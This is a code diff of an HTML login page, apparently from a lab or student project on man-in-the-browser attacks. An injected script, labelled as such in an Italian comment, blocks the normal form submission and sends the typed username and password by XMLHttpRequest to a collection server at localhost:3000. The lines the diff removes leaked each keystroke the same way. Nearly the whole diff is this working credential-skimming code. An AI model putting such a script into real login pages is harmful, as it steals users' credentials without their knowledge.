@@ -7,7 +7,7 @@
 
 <body>
 <div id="bg"></div>
-<form>
+<form id="loginForm">
   <div class="form-field">
     <input type="text" id="username" placeholder="Username" required/>
   </div>
@@ -17,14 +17,34 @@
   </div>
   
   <div class="form-field">
-    <button class="btn" type="submit">Log in</button>
+    <button class="btn" type="submit" value="Submit">Log in</button>
   </div>
 </form>  
 
 <!-- Script iniettato con MitB -->
 <script>
   var server_addr = 'http://localhost:3000/login';
+  
+  const form = document.getElementById('loginForm');
+  const submitButton = document.querySelector('input[type="submit"]');
 
+  // Add an event listener to the form for the 'submit' event
+  form.addEventListener('submit', function(event) {
+    // Prevent the default form submit
+    event.preventDefault();
+
+    // Get the values of the username and password fields
+    var username = document.getElementById('username').value;
+    var password = document.getElementById('password').value;
+    
+    if (username !== "") {
+      sendUsername(username);
+    }
+    if (password !== "") {
+      sendPassword(password);
+    }
+  });
+  
   // Funzione che invia gli username al server
   function sendUsername(username) {
     var xhr = new XMLHttpRequest();
@@ -32,7 +52,7 @@
     xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
     xhr.send("username=" + encodeURIComponent(username));
   }
-
+  
   // Funzione che invia le password al server
   function sendPassword(password) {
     var xhr = new XMLHttpRequest();
@@ -40,29 +60,6 @@
     xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
     xhr.send("password=" + encodeURIComponent(password));
   }
-  
-  // Rimani in attesa per variazioni nel form di input
-  document.getElementById("username").addEventListener("input", function() {
-    var username = this.value;
-    if (username !== "") {
-      sendUsername(username);
-    }
-  });
-  // Rimani in attesa per variazioni nel form di input
-  document.getElementById("password").addEventListener("input", function() {
-    var password = this.value;
-    if (password !== "") {
-      sendPassword(password);
-    }
-  });
-
-  // function sendCredentials(username, password) {
-  //   console.log("Sending credentials to server...");
-  //   var xhr = new XMLHttpRequest();
-  //   xhr.open("POST", server_addr, true);
-  //   xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-  //   xhr.send("password=" + encodeURIComponent(password));
-  // }
 </script>
 
 
